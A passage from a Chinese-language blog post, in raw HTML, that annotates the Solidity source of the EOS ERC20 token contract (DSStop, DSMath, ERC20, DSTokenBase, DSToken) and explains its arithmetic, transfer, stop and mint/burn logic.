函数并没有被实现，但是提供了一个接口给用户，如果用户想要使用，只需要继承 <code>DSAuthority</code>，然后实现该函数，然后使用该继承的合约即可。</p>\n<h3 id=\"5-DSStop\"><a href=\"#5-DSStop\" class=\"headerlink\" title=\"5. DSStop\"></a>5. DSStop</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 停止合约</span><br><span class=\"line\">contract DSStop is DSAuth, DSNote &#123;</span><br><span class=\"line\">    // 停止标识符</span><br><span class=\"line\">    bool public stopped;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 修饰器 检测停止标识符</span><br><span class=\"line\">    modifier stoppable &#123;</span><br><span class=\"line\">        assert (!stopped);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 停止函数</span><br><span class=\"line\">    function stop() auth note &#123;</span><br><span class=\"line\">        stopped = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 启动函数</span><br><span class=\"line\">    function start() auth note &#123;</span><br><span class=\"line\">        stopped = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>继承了 <code>DSAuth / DSNote</code> 合约。定义了 <code>stoppable</code> 检测众筹是否停止。定义了两个函数，分别用来设置停止标识符，表示启动或结束，设置的时候通过 <code>auth</code> 来进行权限验证，<code>note</code> 来触发变更。</p>\n<h3 id=\"6-DSMath\"><a href=\"#6-DSMath\" class=\"headerlink\" title=\"6. DSMath\"></a>6. DSMath</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 安全的数学运算</span><br><span class=\"line\">contract DSMath &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    /*</span><br><span class=\"line\">    标准 uint256 函数 256 位无符号数 即 非负整数 0 ~ 2^256 - 1</span><br><span class=\"line\"></span><br><span class=\"line\">    constant 表示不会改变状态变量</span><br><span class=\"line\">    internal 表示只会被本合约和继承了的合约所使用</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    // 加法</span><br><span class=\"line\">    function add(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        assert((z = x + y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 减法</span><br><span class=\"line\">    function sub(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        assert((z = x - y) &lt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 乘法</span><br><span class=\"line\">    function mul(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        assert((z = x * y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 除法 当除以 0 时，solidity 会自动抛出异常</span><br><span class=\"line\">    function div(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        z = x / y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回较小值</span><br><span class=\"line\">    function min(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        return x &lt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回较大值</span><br><span class=\"line\">    function max(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        return x &gt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    uint128 functions (h is for half) 由 256 位变为 128 位 其余同上</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = x + y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = x - y) &lt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = x * y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = x / y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        return x &lt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        return x &gt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    int256 functions 有符号 256 位函数</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    function imin(int256 x, int256 y) constant internal returns (int256 z) &#123;</span><br><span class=\"line\">        return x &lt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function imax(int256 x, int256 y) constant internal returns (int256 z) &#123;</span><br><span class=\"line\">        return x &gt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    WAD math 提供 18 位精度，同上 乘法和除法加入 WAD</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    uint128 constant WAD = 10 ** 18;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wadd(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hadd(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wsub(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hsub(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * y + WAD / 2) / WAD);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * WAD + y / 2) / y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wmin(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmin(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function wmax(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmax(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    RAY math 同上，但是精度不同 为 10 ** 27</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    uint128 constant RAY = 10 ** 27;</span><br><span class=\"line\"></span><br><span class=\"line\">    function radd(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hadd(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rsub(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hsub(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * y + RAY / 2) / RAY);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * RAY + y / 2) / y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 指数运算</span><br><span class=\"line\">    function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        // This famous algorithm is called &quot;exponentiation by squaring&quot;</span><br><span class=\"line\">        // and calculates x^n with x as fixed-point and n as regular unsigned.</span><br><span class=\"line\">        //</span><br><span class=\"line\">        // It&apos;s O(log n), instead of O(n) for naive repeated multiplication.</span><br><span class=\"line\">        //</span><br><span class=\"line\">        // These facts are why it works:</span><br><span class=\"line\">        //</span><br><span class=\"line\">        //  If n is even, then x^n = (x^2)^(n/2).</span><br><span class=\"line\">        //  If n is odd,  then x^n = x * x^(n-1),</span><br><span class=\"line\">        //   and applying the equation for even x gives</span><br><span class=\"line\">        //    x^n = x * (x^2)^((n-1) / 2).</span><br><span class=\"line\">        //</span><br><span class=\"line\">        //  Also, EVM division is flooring and</span><br><span class=\"line\">        //    floor[(n-1) / 2] = floor[n / 2].</span><br><span class=\"line\"></span><br><span class=\"line\">        z = n % 2 != 0 ? x : RAY;</span><br><span class=\"line\"></span><br><span class=\"line\">        for (n /= 2; n != 0; n /= 2) &#123;</span><br><span class=\"line\">            x = rmul(x, x);</span><br><span class=\"line\"></span><br><span class=\"line\">            if (n % 2 != 0) &#123;</span><br><span class=\"line\">                z = rmul(z, x);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rmin(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmin(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function rmax(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmax(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // x 的 uint256 类型可以无损被转换成 uint128 类型</span><br><span class=\"line\">    function cast(uint256 x) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = uint128(x)) == x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"7-ERC20\"><a href=\"#7-ERC20\" class=\"headerlink\" title=\"7. ERC20\"></a>7. ERC20</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ERC20 抽象合约 接口</span><br><span class=\"line\">contract ERC20 &#123;</span><br><span class=\"line\">    // 代币总量</span><br><span class=\"line\">    function totalSupply() constant returns (uint supply);</span><br><span class=\"line\">    // 用户资产</span><br><span class=\"line\">    function balanceOf(address who) constant returns (uint value);</span><br><span class=\"line\">    // 第三方可提币额度</span><br><span class=\"line\">    function allowance(address owner, address spender) constant returns (uint _allowance);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 转账到指定账户</span><br><span class=\"line\">    function transfer(address to, uint value) returns (bool ok);</span><br><span class=\"line\">    // 从第三方账户转账</span><br><span class=\"line\">    function transferFrom(address from, address to, uint value) returns (bool ok);</span><br><span class=\"line\">    // 设置提币额度</span><br><span class=\"line\">    function approve(address spender, uint value) returns (bool ok);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 转账事件</span><br><span class=\"line\">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class=\"line\">    // 提币事件</span><br><span class=\"line\">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以太坊规定的一个代币接口。与普遍意义上的接口目的相同，对于某些功能的一些约定，满足接口来实现更方便的协同操作。如果代币都实现了接口，那么钱包就能使用同一套方式来操作这些代币等等。</p>\n<h3 id=\"8-DSTokenBase\"><a href=\"#8-DSTokenBase\" class=\"headerlink\" title=\"8. DSTokenBase\"></a>8. DSTokenBase</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 代币基础合约</span><br><span class=\"line\">contract DSTokenBase is ERC20, DSMath &#123;</span><br><span class=\"line\">    uint256                                            _supply; // 代币当前总量</span><br><span class=\"line\">    mapping (address =&gt; uint256)                       _balances; // 余额数组</span><br><span class=\"line\">    mapping (address =&gt; mapping (address =&gt; uint256))  _approvals; // 提币额度数组</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 构造函数</span><br><span class=\"line\">    function DSTokenBase(uint256 supply) &#123;</span><br><span class=\"line\">        _balances[msg.sender] = supply; // 设置发行代币者的初始余额</span><br><span class=\"line\">        _supply = supply; // 设置当前代币总额</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回当前代币总量</span><br><span class=\"line\">    function totalSupply() constant returns (uint256) &#123;</span><br><span class=\"line\">        return _supply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回 src 用户的余额</span><br><span class=\"line\">    function balanceOf(address src) constant returns (uint256) &#123;</span><br><span class=\"line\">        return _balances[src];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回 guy 可以从 src 提取的币量</span><br><span class=\"line\">    function allowance(address src, address guy) constant returns (uint256) &#123;</span><br><span class=\"line\">        return _approvals[src][guy];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 从自己的余额中转移 wad 个代币到 dst 余额中</span><br><span class=\"line\">    function transfer(address dst, uint wad) returns (bool) &#123;</span><br><span class=\"line\">        // 自己的余额足够转账数量 否则 throw</span><br><span class=\"line\">        assert(_balances[msg.sender] &gt;= wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 DSMath 来对余额进行增减</span><br><span class=\"line\">        _balances[msg.sender] = sub(_balances[msg.sender], wad);</span><br><span class=\"line\">        _balances[dst] = add(_balances[dst], wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 触发事件</span><br><span class=\"line\">        Transfer(msg.sender, dst, wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 从 src 转移 wad 个代币到 dst 余额</span><br><span class=\"line\">    function transferFrom(address src, address dst, uint wad) returns (bool) &#123;</span><br><span class=\"line\">    \t// 转账金额不能超额</span><br><span class=\"line\">        assert(_balances[src] &gt;= wad);</span><br><span class=\"line\">        assert(_approvals[src][msg.sender] &gt;= wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 DSMath 来处理余额</span><br><span class=\"line\">        _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);</span><br><span class=\"line\">        _balances[src] = sub(_balances[src], wad);</span><br><span class=\"line\">        _balances[dst] = add(_balances[dst], wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 触发事件</span><br><span class=\"line\">        Transfer(src, dst, wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 设置 guy 可以从自己的余额中提取 wad 个代币</span><br><span class=\"line\">    function approve(address guy, uint256 wad) returns (bool) &#123;</span><br><span class=\"line\">        _approvals[msg.sender][guy] = wad;</span><br><span class=\"line\">        </span><br><span class=\"line\">        Approval(msg.sender, guy, wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>继承 <code>DSMath</code> 和抽象合约 <code>ERC20</code>。实现 <code>ERC20</code> 的代币函数，使用 <code>DSMath</code> 来处理余额。</p>\n<h3 id=\"9-DSToken\"><a href=\"#9-DSToken\" class=\"headerlink\" title=\"9. DSToken\"></a>9. DSToken</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 具体代币合约</span><br><span class=\"line\">// `DSTokenBase(0)` 运行了 `DSTokenBase` 的构造函数，传入的参数值为 0。</span><br><span class=\"line\">contract DSToken is DSTokenBase(0), DSStop &#123;</span><br><span class=\"line\">    bytes32  public  symbol; // 代币符号 如 EOS</span><br><span class=\"line\">    uint256  public  decimals = 18; // 标准的代币精度，可以被定制</span><br><span class=\"line\"></span><br><span class=\"line\">    // 构造函数 设置代币符号</span><br><span class=\"line\">    function DSToken(bytes32 symbol_) &#123;</span><br><span class=\"line\">        symbol = symbol_;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address dst, uint wad) stoppable note returns (bool) &#123;</span><br><span class=\"line\">        return super.transfer(dst, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transferFrom(</span><br><span class=\"line\">        address src, address dst, uint wad</span><br><span class=\"line\">    ) stoppable note returns (bool) &#123;</span><br><span class=\"line\">        return super.transferFrom(src, dst, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function approve(address guy, uint wad) stoppable note returns (bool) &#123;</span><br><span class=\"line\">        return super.approve(guy, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 推送 本合约 `transfer()` 的别名</span><br><span class=\"line\">    function push(address dst, uint128 wad) returns (bool) &#123;</span><br><span class=\"line\">        return transfer(dst, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 拉取 本合约 `transferFrom()` 的特例</span><br><span class=\"line\">    function pull(address src, uint128 wad) returns (bool) &#123;</span><br><span class=\"line\">        return transferFrom(src, msg.sender, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 充值 增加代币</span><br><span class=\"line\">    function mint(uint128 wad) auth stoppable note &#123;</span><br><span class=\"line\">        _balances[msg.sender] = add(_balances[msg.sender], wad);</span><br><span class=\"line\">        _supply = add(_supply, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 燃烧 销毁代币</span><br><span class=\"line\">    function burn(uint128 wad) auth stoppable note &#123;</span><br><span class=\"line\">        _balances[msg.sender] = sub(_balances[msg.sender], wad);</span><br><span class=\"line\">        _supply = sub(_supply, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Optional token name</span><br><span class=\"line\"></span><br><span class=\"line\">    bytes32   public  name = &quot;&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setName(bytes32 name_) auth &#123;</span><br><span class=\"line\">        name = name_;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>transfer / transferFrom / approve / mint / burn</code> 等方法使用了 <code>stoppable / note</code> 修饰器，在执行这些函数前，需要判断众筹是否已经停止，如果未停止，触发记录事件。</p>\n<p><code>mint / burn</code> 还在其他修饰器之前使用了 <code>auth</code> 修饰器，表示在使用这两个函数时，首要检查调用这些函数的用户是否合法。</p>\n<p>比起 <code>ERC20</code> 约定的基本函数，本合约额外增加了 <code>push / pull / mint / burn</code>。从具体代码来看，<code>push</code> 成了 <code>transfer</code> 的一个别名，而 <code>pull</code> 调用 <code>transferFrom</code> 时将 <code>dst</code> 固定为 <code>msg.sender</code>。从逻辑上来看，<code>push / pull</code> 是针对转账的额外处理，用于当前用户对自身余额的操作。<code>mint / burn</code> 则是对应于 <code>EOS</code> 的众筹方式。</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>从区块浏览器内查询到的 EOS 合约如上。合约本身并不复杂，Solidity 的基本语法，和 ERC20 代币的逻辑。但是如 <code>DSToken</code> 合约中的 <code>mint / burn</code> 则与 EOS 的众筹方式相关：<a href=\"https://github.com/EOSIO/eos-token-distribution\" target=\"_blank\" rel=\"noopener\">GitHub 仓库</a> - <a href=\"https://etherscan.io/address/0xd0a6e6c54dbc68db5db3a091b171a77407ff7ccf#code\" target=\"_blank\" 